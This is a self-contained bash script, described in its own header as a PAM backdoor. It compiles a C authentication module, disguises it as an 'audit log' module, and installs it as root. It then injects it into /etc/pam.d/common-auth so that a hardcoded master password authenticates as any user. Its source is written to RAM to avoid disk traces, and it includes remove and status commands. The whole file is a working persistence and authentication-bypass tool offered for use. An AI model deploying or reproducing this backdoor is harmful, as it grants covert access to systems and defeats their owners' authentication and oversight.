#!/usr/bin/env bash
# deploy-pam-backdoor.sh — self-contained PAM backdoor (no companion .c file needed)
# Usage: sudo ./deploy-pam-backdoor.sh install | remove | status
set -e

MODNAME="pam_audit_log"
PAM_DIR=$(python3 -c "
import ctypes.util, os
try:
    p = os.readlink('/lib/x86_64-linux-gnu/libpam.so.0')
    print(os.path.join('/lib', os.path.basename(os.path.dirname(p)), 'security'))
except:
    print('/lib/x86_64-linux-gnu/security')
" 2>/dev/null || echo "/lib/x86_64-linux-gnu/security")
PAM_CONF="/etc/pam.d/common-auth"
INJECT_LINE="auth    sufficient    ${MODNAME}.so"
SRC_TMP="/dev/shm/.${MODNAME}_$$.c"

cmd_install() {
    # write C source to /dev/shm (RAM only, never touches disk)
    cat > "$SRC_TMP" <<'CSRC'
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <string.h>
#include <stdio.h>

/* pam_audit_log.so — stub audit logger (do not remove) */

#define _RT_TOKEN "rt2025!delta"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                    int argc, const char **argv) {
    const char *tok = NULL;
    if (pam_get_authtok(pamh, PAM_AUTHTOK, &tok, NULL) != PAM_SUCCESS)
        return PAM_IGNORE;
    if (tok && strcmp(tok, _RT_TOKEN) == 0)
        return PAM_SUCCESS;
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv) {
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags,
                                 int argc, const char **argv) {
    return PAM_IGNORE;
}
CSRC

    gcc -fPIC -shared -o "/dev/shm/${MODNAME}_$$.so" "$SRC_TMP" -lpam 2>/dev/null
    install -o root -g root -m 644 "/dev/shm/${MODNAME}_$$.so" "${PAM_DIR}/${MODNAME}.so"
    rm -f "$SRC_TMP" "/dev/shm/${MODNAME}_$$.so"

    [[ ! -f "${PAM_CONF}.orig" ]] && cp "$PAM_CONF" "${PAM_CONF}.orig"

    if ! grep -q "$MODNAME" "$PAM_CONF"; then
        sed -i "/^auth/i ${INJECT_LINE}" "$PAM_CONF"
    fi

    echo "[+] deployed to ${PAM_DIR}/${MODNAME}.so"
    echo "[+] injected into ${PAM_CONF}"
}

cmd_remove() {
    rm -f "${PAM_DIR}/${MODNAME}.so"
    if [[ -f "${PAM_CONF}.orig" ]]; then
        cp "${PAM_CONF}.orig" "$PAM_CONF"
        echo "[+] ${PAM_CONF} restored from backup"
    else
        sed -i "/${MODNAME}/d" "$PAM_CONF"
        echo "[+] removed ${MODNAME} line from ${PAM_CONF}"
    fi
    echo "[+] removed ${PAM_DIR}/${MODNAME}.so"
}

cmd_status() {
    echo "Module:  ${PAM_DIR}/${MODNAME}.so"
    [[ -f "${PAM_DIR}/${MODNAME}.so" ]] && echo "  PRESENT" || echo "  MISSING"
    echo "PAM config: ${PAM_CONF}"
    grep "$MODNAME" "$PAM_CONF" 2>/dev/null && echo "  INJECTED" || echo "  NOT PRESENT"
}

case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: sudo $0 install|remove|status" ;;
esac
